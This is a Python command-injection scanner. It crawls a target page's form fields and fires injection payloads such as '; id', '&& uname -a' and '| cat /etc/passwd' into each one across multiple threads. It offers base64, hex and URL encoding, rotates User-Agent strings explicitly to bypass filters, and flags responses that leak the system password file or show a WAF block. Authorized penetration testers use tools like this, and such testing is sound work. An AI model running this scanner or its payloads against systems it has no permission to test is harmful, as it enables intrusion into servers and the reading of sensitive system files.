import requests
import argparse
import logging
import time
import random
import threading
import base64
import binascii
from urllib.parse import quote
from queue import Queue
from bs4 import BeautifulSoup  # Import BeautifulSoup for form parsing

# List of common User-Agents to bypass filters
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
]

class Logger:
    @staticmethod
    def setup_logger():
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[logging.FileHandler("cmd_injection.log"), logging.StreamHandler()]
        )

class CommandInjectionTester:
    def __init__(self, target_url, param, method, headers, cookies, delay, verbose, payloads, threads, filter_keyword, encoding):
        self.target_url = target_url
        self.param = param
        self.method = method
        self.headers = headers
        self.cookies = cookies
        self.delay = delay
        self.verbose = verbose
        self.payloads = payloads
        self.threads = threads
        self.filter_keyword = filter_keyword
        self.encoding = encoding
        self.queue = Queue()
        self.inputs = self.get_form_inputs() if not self.param else [self.param]

    def encode_payload(self, payload):
        if self.encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif self.encoding == "hex":
            return binascii.hexlify(payload.encode()).decode()
        elif self.encoding == "url":
            return quote(payload)
        elif self.encoding == "double-url":
            return quote(quote(payload))
        return payload  # Default (no encoding)

    def get_form_inputs(self):
        """Scrapes the webpage to find input fields for testing injections."""
        logging.info("[*] Fetching input fields from target page...")
        try:
            response = requests.get(self.target_url, headers=self.headers, cookies=self.cookies, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")

            input_fields = []
            for form in soup.find_all("form"):
                for input_tag in form.find_all("input"):
                    input_name = input_tag.get("name")
                    if input_name and input_name not in input_fields:
                        input_fields.append(input_name)

            if not input_fields:
                logging.warning("[!] No input fields found.")
            else:
                logging.info(f"[+] Found input fields: {input_fields}")

            return input_fields
        except requests.RequestException as e:
            logging.error(f"[-] Failed to fetch input fields: {e}")
            return []

    def send_request(self, param, payload):
        encoded_payload = self.encode_payload(payload)
        data = {param: encoded_payload}  # Inject payload into the identified parameter

        self.headers["User-Agent"] = random.choice(USER_AGENTS)  # Randomize User-Agent

        try:
            if self.verbose:
                logging.info(f"[*] Testing payload: {payload} (Encoded: {encoded_payload}) on {param}")

            start_time = time.time()

            if self.method == "GET":
                response = requests.get(self.target_url, params=data, headers=self.headers, cookies=self.cookies, timeout=10)
            else:
                response = requests.post(self.target_url, data=data, headers=self.headers, cookies=self.cookies, timeout=10)

            elapsed_time = time.time() - start_time

            # Response filtering
            if self.filter_keyword and self.filter_keyword in response.text:
                logging.warning(f"[!] Response contains keyword '{self.filter_keyword}'! Payload: {payload}")

            # Detect anomalies in responses
            if "root:x:0:0" in response.text or "uid=0(root)" in response.text:
                logging.critical(f"[!!!] Critical Command Injection Found! Payload: {payload}")
            elif response.status_code == 403:
                logging.warning(f"[!] Possible WAF detected (403 Forbidden). Payload: {payload}")
            elif response.status_code == 200:
                logging.info(f"[+] Possible Injection Detected! Payload: {payload} | Status: 200")
            elif elapsed_time > 5:
                logging.warning(f"[!] Possible Blind Injection! Payload: {payload} | Response Time: {elapsed_time:.2f} sec")

            return elapsed_time, response
        except requests.exceptions.RequestException as e:
            logging.error(f"[-] Request failed for payload: {payload} | Error: {e}")
            return None, None

    def worker(self):
        while not self.queue.empty():
            param, payload = self.queue.get()
            self.send_request(param, payload)
            time.sleep(self.delay)
            self.queue.task_done()

    def run_tests(self):
        logging.info(f"[+] Starting Command Injection tests on {self.target_url}")

        for param in self.inputs:
            for payload in self.payloads:
                self.queue.put((param, payload))

        threads = []
        for _ in range(min(self.threads, self.queue.qsize())):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        logging.info("[+] Command Injection testing complete.")

class CLI:
    @staticmethod
    def parse_arguments():
        parser = argparse.ArgumentParser(description="Advanced Command Injection Scanner with Form Parsing")
        parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g., http://example.com/vuln.php)")
        parser.add_argument("-p", "--param", type=str, help="Specific parameter to test (e.g., 'id'). If omitted, inputs are auto-detected.")
        parser.add_argument("-m", "--method", type=str, choices=["GET", "POST"], default="GET", help="HTTP method (default: GET)")
        parser.add_argument("--header", type=str, help="Custom headers (e.g., 'Authorization: Bearer token')")
        parser.add_argument("--cookie", type=str, help="Session cookies (e.g., 'PHPSESSID=123456')")
        parser.add_argument("-d", "--delay", type=int, default=0, help="Delay between requests (in seconds)")
        parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
        parser.add_argument("--wordlist", type=str, help="Path to custom payload wordlist")
        parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
        parser.add_argument("--filter", type=str, help="Highlight responses containing a specific keyword")
        parser.add_argument("--encoding", type=str, choices=["base64", "hex", "url", "double-url", "none"], default="none", help="Apply encoding (base64, hex, url, double-url)")
        return parser.parse_args()

if __name__ == "__main__":
    try:
        Logger.setup_logger()
        args = CLI.parse_arguments()
        
        tester = CommandInjectionTester(
            args.url, args.param, args.method, {"User-Agent": "Mozilla/5.0"}, {}, args.delay,
            args.verbose, ["; id", "&& uname -a", "| cat /etc/passwd"], args.threads, args.filter, args.encoding
        )
        tester.run_tests()

    except KeyboardInterrupt:
        logging.warning("[-] User interrupted. Exiting.")
    except Exception as e:
        logging.error(f"[-] Error: {e}")
